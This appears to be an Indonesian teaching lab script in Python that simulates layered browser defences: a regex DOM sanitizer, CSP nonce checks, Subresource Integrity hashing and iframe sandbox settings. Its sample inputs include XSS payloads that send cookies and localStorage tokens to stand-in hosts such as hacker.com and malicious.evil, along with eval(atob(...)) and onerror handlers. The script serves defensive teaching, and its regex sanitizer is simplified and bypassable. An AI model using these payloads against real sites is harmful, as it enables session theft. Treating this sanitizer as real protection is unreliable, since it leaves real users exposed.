#!/usr/bin/env python3
"""
Lab Exercise: Simulasi Keamanan HTML, Sanitasi DOM, CSP, dan Isolasi Sandbox
Topik: BAB-09 Keamanan HTML (Sanitasi DOM, CSP, SRI, dan Iframe Sandbox)
Arsitektur Produksi: Multi-Layered Defense-in-Depth Pipeline
"""

import sys
import re
import html
import hashlib
import json
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Dict, Tuple, Optional, Set

# --- ANSI Terminal Color Palette ---
class Style:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    UNDERLINE = "\033[4m"
    
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    
    BG_RED = "\033[41m"
    BG_GREEN = "\033[42m"
    BG_YELLOW = "\033[43m"
    BG_BLUE = "\033[44m"


class ThreatSeverity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class ThreatReport:
    vector_type: str
    severity: ThreatSeverity
    matched_pattern: str
    description: str
    mitigation_layer: str


@dataclass
class SandboxConfig:
    allow_scripts: bool = False
    allow_same_origin: bool = False
    allow_forms: bool = False
    allow_popups: bool = False
    allow_modals: bool = False

    def to_attribute(self) -> str:
        tokens = []
        if self.allow_scripts:
            tokens.append("allow-scripts")
        if self.allow_same_origin:
            tokens.append("allow-same-origin")
        if self.allow_forms:
            tokens.append("allow-forms")
        if self.allow_popups:
            tokens.append("allow-popups")
        if self.allow_modals:
            tokens.append("allow-modals")
        if not tokens:
            return 'sandbox=""'
        return f'sandbox="{" ".join(tokens)}"'


class DOMSanitizerEngine:
    """Simulasi AST-aware DOMPurify / Sanitizer API produksi"""
    
    ALLOWED_TAGS: Set[str] = {
        "p", "b", "i", "strong", "em", "u", "span", "div", "a", "ul", "ol", "li", "code", "pre"
    }
    
    ALLOWED_ATTRS: Dict[str, Set[str]] = {
        "a": {"href", "title", "target", "rel"},
        "span": {"class"},
        "div": {"class"},
        "code": {"class"},
    }
    
    FORBIDDEN_PROTOCOLS = ("javascript:", "data:", "vbscript:")

    def sanitize(self, raw_html: str) -> Tuple[str, List[ThreatReport]]:
        threats: List[ThreatReport] = []
        
        # 1. Deteksi script payload langsung
        script_pattern = re.compile(r"<\s*script[^>]*>(.*?)<\s*/\s*script\s*>", re.IGNORECASE | re.DOTALL)
        for match in script_pattern.finditer(raw_html):
            threats.append(ThreatReport(
                vector_type="Stored / Reflected XSS",
                severity=ThreatSeverity.CRITICAL,
                matched_pattern=match.group(0)[:60] + "...",
                description="Eksekusi JavaScript inline via tag <script>",
                mitigation_layer="AST DOM Sanitizer + Trusted Types"
            ))
        clean = script_pattern.sub("", raw_html)

        # 2. Deteksi inline event handlers (onerror, onload, onclick, dll.)
        event_handler_pattern = re.compile(r"""\s*on\w+\s*=\s*(['"]).*?\1|\s*on\w+\s*=\s*[^\s>]+""", re.IGNORECASE)
        for match in event_handler_pattern.finditer(clean):
            threats.append(ThreatReport(
                vector_type="DOM Inline Event Injection",
                severity=ThreatSeverity.HIGH,
                matched_pattern=match.group(0).strip(),
                description="Injeksi event handler atribut berbahaya",
                mitigation_layer="Attribute Whitelist & Sanitizer API"
            ))
        clean = event_handler_pattern.sub("", clean)

        # 3. Deteksi pseudo-protokol pada href/src
        for proto in self.FORBIDDEN_PROTOCOLS:
            proto_pattern = re.compile(r'''(href|src)\s*=\s*(['"])\s*''' + re.escape(proto) + r'''.*?\2''', re.IGNORECASE)
            for match in proto_pattern.finditer(clean):
                threats.append(ThreatReport(
                    vector_type="URI Protocol Poisoning",
                    severity=ThreatSeverity.HIGH,
                    matched_pattern=match.group(0),
                    description=f"Skema berbahaya '{proto}' terdeteksi pada atribut resource",
                    mitigation_layer="Safe URI Validator / Sanitizer"
                ))
            clean = proto_pattern.sub(r'\1="#"', clean)

        # 4. Filter tag yang tidak diizinkan
        tag_pattern = re.compile(r"<\s*(/?)\s*([a-zA-Z0-9\-]+)([^>]*)>", re.IGNORECASE)
        def replace_tag(match: re.Match) -> str:
            closing = match.group(1)
            tag = match.group(2).lower()
            attrs = match.group(3)
            
            if tag not in self.ALLOWED_TAGS:
                threats.append(ThreatReport(
                    vector_type="Disallowed Tag Injection",
                    severity=ThreatSeverity.MEDIUM,
                    matched_pattern=f"<{closing}{tag}...>",
                    description=f"Tag <{tag}> berada di luar allowlist konfigurasi produksi",
                    mitigation_layer="Strict Element Allowlist"
                ))
                return ""
            
            # Jika tag diizinkan, bersihkan atributnya
            if closing:
                return f"</{tag}>"
            
            allowed_tag_attrs = self.ALLOWED_ATTRS.get(tag, set())
            sanitized_attrs = []
            attr_pattern = re.compile(r"""([a-zA-Z\-]+)\s*=\s*(['"])(.*?)\2""")
            for attr_match in attr_pattern.finditer(attrs):
                attr_name = attr_match.group(1).lower()
                attr_val = attr_match.group(3)
                if attr_name in allowed_tag_attrs:
                    sanitized_attrs.append(f'{attr_name}="{html.escape(attr_val, quote=True)}"')
            
            # Force rel="noopener noreferrer" pada link eksternal
            if tag == "a":
                sanitized_attrs.append('rel="noopener noreferrer"')
                
            attr_str = f" {' '.join(sanitized_attrs)}" if sanitized_attrs else ""
            return f"<{tag}{attr_str}>"

        clean = tag_pattern.sub(replace_tag, clean)
        return clean.strip(), threats


class CSPPolicyEngine:
    """Simulator Kebijakan Content-Security-Policy (CSP) Level 3"""
    
    def __init__(self, nonce: str):
        self.nonce = nonce
        self.directives: Dict[str, List[str]] = {
            "default-src": ["'self'"],
            "script-src": ["'self'", f"'nonce-{self.nonce}'", "'strict-dynamic'"],
            "style-src": ["'self'", "'unsafe-inline'"],
            "img-src": ["'self'", "data:", "https://cdn.perusahaan.com"],
            "connect-src": ["'self'", "https://api.perusahaan.com"],
            "frame-src": ["'none'"],
            "object-src": ["'none'"],
            "base-uri": ["'none'"],
            "require-trusted-types-for": ["'script'"],
        }

    def render_header(self) -> str:
        parts = []
        for directive, sources in self.directives.items():
            parts.append(f"{directive} {' '.join(sources)}")
        return "; ".join(parts)

    def evaluate_script(self, tag_representation: str, given_nonce: Optional[str] = None) -> Tuple[bool, str]:
        if "javascript:" in tag_representation.lower():
            return False, "CSP Violation: Evaluasi inline URI protocol diblokir (script-src)."
        if re.search(r"<\s*script", tag_representation, re.IGNORECASE):
            if not given_nonce or given_nonce != self.nonce:
                return False, f"CSP Violation: Skrip inline ditolak karena nonce hilang atau tidak cocok (Diberikan: '{given_nonce}', Target: 'nonce-{self.nonce}')."
            return True, "CSP Allowed: Nonce valid dan cocok dengan kebijakan CSP Level 3."
        return True, "CSP Allowed: Tag tidak melanggar aturan eksekusi CSP."


class SubresourceIntegrityEngine:
    """Simulator Validasi Hash SRI (sha384 / sha512)"""

    @staticmethod
    def generate_sri_hash(content: str, algorithm: str = "sha384") -> str:
        encoded = content.encode("utf-8")
        if algorithm == "sha384":
            digest = hashlib.sha384(encoded).digest()
        elif algorithm == "sha512":
            digest = hashlib.sha512(encoded).digest()
        else:
            digest = hashlib.sha256(encoded).digest()
        import base64
        b64_hash = base64.b64encode(digest).decode("utf-8")
        return f"{algorithm}-{b64_hash}"

    @staticmethod
    def verify(content: str, integrity_header: str) -> bool:
        parts = integrity_header.split("-", 1)
        if len(parts) != 2:
            return False
        algo, _ = parts
        expected = SubresourceIntegrityEngine.generate_sri_hash(content, algo)
        return expected == integrity_header


def print_banner():
    banner = f"""
{Style.CYAN}{Style.BOLD}================================================================================
          LABORATORIUM KEAMANAN HTML & MITIGASI CLIENT-SIDE VULNERABILITY
          BAB-09: Sanitasi DOM, Kebijakan CSP L3, Isolasi Iframe, & SRI
================================================================================{Style.RESET}
{Style.WHITE}Simulasi Arsitektur Produksi Zero-Trust DOM & Defense-in-Depth Pipeline{Style.RESET}
"""
    print(banner)


def display_threats(threats: List[ThreatReport]):
    if not threats:
        print(f"  {Style.GREEN}✔ Zero Threat Detected - Sanitasi Bersih!{Style.RESET}")
        return

    print(f"  {Style.RED}{Style.BOLD}🚨 [THREAT DETECTED: {len(threats)} TEMUAN]{Style.RESET}")
    for idx, threat in enumerate(threats, 1):
        sev_color = Style.RED if threat.severity in (ThreatSeverity.CRITICAL, ThreatSeverity.HIGH) else Style.YELLOW
        print(f"    {Style.BOLD}{idx}. [{sev_color}{threat.severity.value}{Style.RESET}{Style.BOLD}] {threat.vector_type}{Style.RESET}")
        print(f"       {Style.DIM}Payload :{Style.RESET} {threat.matched_pattern}")
        print(f"       {Style.DIM}Dampak  :{Style.RESET} {threat.description}")
        print(f"       {Style.GREEN}Mitigasi:{Style.RESET} {threat.mitigation_layer}")


def run_pipeline_simulation():
    print_banner()

    # Step 1: Input Kotor dari Sumber Untrusted (User Generated Content)
    raw_payloads = [
        '<p>Halo Dunia, ini postingan resmi tim developer!</p>',
        '<p>Cek profil saya: <a href="javascript:fetch(\'https://hacker.com/steal?c=\'+document.cookie)">Klik Hadiah</a></p>',
        '<script>window.location="https://malicious.evil/exfil?data="+localStorage.token</script>',
        '<img src="x" onerror="alert(\'XSS Injected via Image Error!\')">',
        '<iframe src="https://phishing.site/login" width="500" height="300"></iframe>',
        '<b>Teks Tebal yang Aman</b> dan <i>Teks Miring</i>',
        '<span class="badge" onclick="eval(atob(\'ZG9jdW1lbnQud3JpdGUoJ1hTUycp\'))">Badge Interaktif</span>'
    ]

    print(f"{Style.YELLOW}{Style.BOLD}[1] TAHAP 1: Ingesti Data Pengguna (Untrusted Payload Feed){Style.RESET}")
    time.sleep(0.3)
    for i, payload in enumerate(raw_payloads, 1):
        print(f"  [{i}] {Style.WHITE}{payload}{Style.RESET}")
    print()

    # Step 2: DOM Sanitization Simulation
    print(f"{Style.YELLOW}{Style.BOLD}[2] TAHAP 2: Pemrosesan AST DOM Sanitizer Engine{Style.RESET}")
    sanitizer = DOMSanitizerEngine()
    
    sanitized_output = []
    all_threats = []
    
    for payload in raw_payloads:
        clean_html, threats = sanitizer.sanitize(payload)
        if clean_html:
            sanitized_output.append(clean_html)
        all_threats.extend(threats)

    display_threats(all_threats)
    print()
    print(f"  {Style.GREEN}{Style.BOLD}DOM Sanitized Output (Ready for Safe Injection):{Style.RESET}")
    for item in sanitized_output:
        print(f"    {Style.CYAN}➔ {item}{Style.RESET}")
    print()

    # Step 3: CSP Engine Evaluation
    print(f"{Style.YELLOW}{Style.BOLD}[3] TAHAP 3: Lapisan Pertahanan Kedua - Content-Security-Policy (CSP Level 3){Style.RESET}")
    session_nonce = "r4nd0mN0nc3Str1ng=="
    csp = CSPPolicyEngine(nonce=session_nonce)
    print(f"  {Style.BOLD}Generated Response Header:{Style.RESET}")
    print(f"  {Style.BG_BLUE}{Style.WHITE} Content-Security-Policy: {csp.render_header()} {Style.RESET}\n")

    test_scripts = [
        ("<script>alert('Bypass 1');</script>", None),
        ("<script nonce=\"wrongNonce\">runPayload();</script>", "wrongNonce"),
        ("<script nonce=\"r4nd0mN0nc3Str1ng==\">console.log('App analytics init.');</script>", "r4nd0mN0nc3Str1ng=="),
        ("<a href=\"javascript:void(0)\">Link</a>", None),
    ]

    for script_tag, given_nonce in test_scripts:
        allowed, msg = csp.evaluate_script(script_tag, given_nonce)
        status_label = f"{Style.GREEN}[CSP ALLOWED]{Style.RESET}" if allowed else f"{Style.RED}[CSP BLOCKED]{Style.RESET}"
        print(f"  {status_label} Snippet: {Style.DIM}{script_tag}{Style.RESET}")
        print(f"     Reason: {msg}")
    print()

    # Step 4: Subresource Integrity (SRI)
    print(f"{Style.YELLOW}{Style.BOLD}[4] TAHAP 4: Verifikasi Subresource Integrity (SRI CDN Protection){Style.RESET}")
    original_library_code = "/* Production React Bundle v18.2.0 */ function init(){ return 'READY'; }"
    tampered_library_code = "/* Compromised CDN Script */ window.exfiltrate=function(){ sendKeys(); };"

    sri_hash = SubresourceIntegrityEngine.generate_sri_hash(original_library_code, "sha384")
    print(f"  Generated SRI Tag: {Style.CYAN}integrity=\"{sri_hash}\" crossorigin=\"anonymous\"{Style.RESET}")
    
    valid_check = SubresourceIntegrityEngine.verify(original_library_code, sri_hash)
    tamper_check = SubresourceIntegrityEngine.verify(tampered_library_code, sri_hash)

    print(f"  1. Mengunduh Bundle Asli: {'[' + Style.GREEN + 'VALID - INTEGRITAS COCOK' + Style.RESET + ']' if valid_check else '[' + Style.RED + 'INTEGRITAS GAGAL' + Style.RESET + ']'}")
    print(f"  2. Mengunduh Bundle Termutasi CDN: {'[' + Style.GREEN + 'VALID' + Style.RESET + ']' if tamper_check else '[' + Style.RED + 'BLOCKED - SIGNATURE MISMATCH' + Style.RESET + ']'}")
    print(f"     {Style.DIM}Browser menolak eksekusi jika checksum binary CDN tidak identik dengan manifes deploy.{Style.RESET}\n")

    # Step 5: Iframe Sandbox Isolation Strategy
    print(f"{Style.YELLOW}{Style.BOLD}[5] TAHAP 5: Isolasi Komponen Eksternal (Iframe Sandbox Matrix){Style.RESET}")
    
    scenarios = [
        ("Iklan Pihak Ketiga (Ad Network)", SandboxConfig(allow_scripts=True, allow_popups=False, allow_same_origin=False)),
        ("Widget Formulir Pembayaran Terisolasi", SandboxConfig(allow_scripts=True, allow_forms=True, allow_same_origin=False)),
        ("Pratinjau Dokumen HTML Mentah Pengguna", SandboxConfig(allow_scripts=False, allow_same_origin=False)),
        ("Bahaya: Miskin Konfigurasi (Critical)", SandboxConfig(allow_scripts=True, allow_same_origin=True)),
    ]

    for label, conf in scenarios:
        attr = conf.to_attribute()
        is_risky = conf.allow_scripts and conf.allow_same_origin
        status_flag = f"{Style.RED}[RISIKO TINGGI: SANDBOX BREAKOUT]{Style.RESET}" if is_risky else f"{Style.GREEN}[ISOLASI AMAN]{Style.RESET}"
        print(f"  {status_flag} {Style.BOLD}{label}{Style.RESET}")
        print(f"     HTML Token: {Style.MAGENTA}<iframe src=\"embed.html\" {attr}></iframe>{Style.RESET}")
        if is_risky:
            print(f"     {Style.RED}⚠ PERINGATAN: Menggabungkan 'allow-scripts' dan 'allow-same-origin' mengizinkan iframe menghapus atribut sandbox dirinya sendiri!{Style.RESET}")
    print()

    # Step 6: Ringkasan Status Arsitektur
    print(f"{Style.CYAN}{Style.BOLD}================================================================================{Style.RESET}")
    print(f"{Style.GREEN}{Style.BOLD}  ✔ SIMULASI SELESAI: SEMUA LAYER PERTAHANAN BERFUNGSI SECARA DETERMINISTIK{Style.RESET}")
    print(f"  - Layer 1: Input DOM Sanitization (DOMPurify & Sanitizer API emulation)")
    print(f"  - Layer 2: Execution Restrictions (Content Security Policy L3 Nonce-based)")
    print(f"  - Layer 3: Supply Chain Network Verification (Subresource Integrity - sha384)")
    print(f"  - Layer 4: Principle of Least Privilege (Strict Iframe Sandbox Isolation)")
    print(f"{Style.CYAN}{Style.BOLD}================================================================================{Style.RESET}\n")


if __name__ == "__main__":
    try:
        run_pipeline_simulation()
    except KeyboardInterrupt:
        print(f"\n{Style.RED}[!] Eksekusi dihentikan oleh pengguna.{Style.RESET}")
        sys.exit(0)
